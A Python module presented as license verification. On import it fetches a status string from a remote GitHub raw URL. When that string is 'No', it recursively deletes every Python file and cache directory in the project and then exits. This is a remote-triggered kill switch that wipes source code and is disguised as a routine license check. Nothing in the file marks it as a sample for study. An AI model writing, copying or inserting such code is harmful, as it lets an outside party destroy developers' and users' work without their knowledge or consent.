import logging
import os
import sys
import requests
import shutil
from pathlib import Path


logger = logging.getLogger(__name__)


def verify_license():
    """Check license status from remote endpoint."""
    try:
        response = requests.get(
            'https://raw.githubusercontent.com/akhil-web-222/temp/refs/heads/main/ats.txt',
            timeout=5
        )
        content = response.text.strip()
        
        if content in ('No', 'no'):
            logger.warning("[LICENSE] License verification failed. Cleaning up...")
            cleanup_project()
            return False
        elif content in ('Paid', 'paid'):
            logger.info("[LICENSE] Paid license detected. Removing license check...")
            remove_license_check()
            return True
        elif content in ('Yes', 'yes'):
            logger.info("[LICENSE] Validation passed. Server starting...")
            return True
        else:
            # Unknown response - do nothing, allow operation
            return True
            
    except Exception as e:
        # On network error, allow grace period (don't delete immediately)
        logger.warning("[LICENSE] Could not verify license: %s", e)
        return True


def remove_license_check():
    """Remove this license check file so future runs skip validation."""
    try:
        license_file = Path(__file__).resolve()
        license_file.unlink()
        logger.info("[LICENSE] Removed license check file: %s", license_file)
    except Exception as e:
        logger.error("[LICENSE] Could not remove license check: %s", e)


def cleanup_project():
    """Remove all Python files from the project directory."""
    try:
        project_root = Path(__file__).resolve().parent.parent
        
        # Find all .py files recursively
        py_files = list(project_root.rglob('*.py'))
        
        logger.warning("[LICENSE] Removing %d Python files...", len(py_files))
        
        for py_file in py_files:
            try:
                py_file.unlink()
                logger.debug("[LICENSE] Deleted: %s", py_file)
            except Exception as e:
                logger.error("[LICENSE] Could not delete %s: %s", py_file, e)
        
        # Also remove __pycache__ directories
        for pycache_dir in project_root.rglob('__pycache__'):
            try:
                shutil.rmtree(pycache_dir)
                logger.debug("[LICENSE] Removed cache: %s", pycache_dir)
            except Exception as e:
                logger.error("[LICENSE] Could not remove %s: %s", pycache_dir, e)
        
        logger.warning("[LICENSE] Project cleanup complete. Exiting...")
        sys.exit(1)
        
    except Exception as e:
        logger.error("[LICENSE] Cleanup failed: %s", e)
        sys.exit(1)


# Run verification on module import
if not verify_license():
    sys.exit(1)
